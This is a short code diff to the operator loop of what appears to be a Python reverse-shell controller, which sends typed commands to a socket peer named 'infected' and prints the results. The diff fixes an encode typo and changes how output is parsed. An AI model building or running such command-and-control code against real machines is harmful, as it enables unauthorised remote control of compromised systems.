@@ -29,16 +29,16 @@ print("Current working directory: ",cwd)
 
 while True:
 
-    command = input(f"{cwd}$> ")
+    command = input(f"{cwd} $> ")
     if not command.strip():
         continue
 
-    infected.send(command.endcode()) 
+    infected.send(command.encode()) 
     if command.lower() == "exit":
         break
 
     output = infected.recv(Size).decode()
-    results, cwd = output.split(SEP)
+    results = output.split(SEP)
 
 
     print(results)
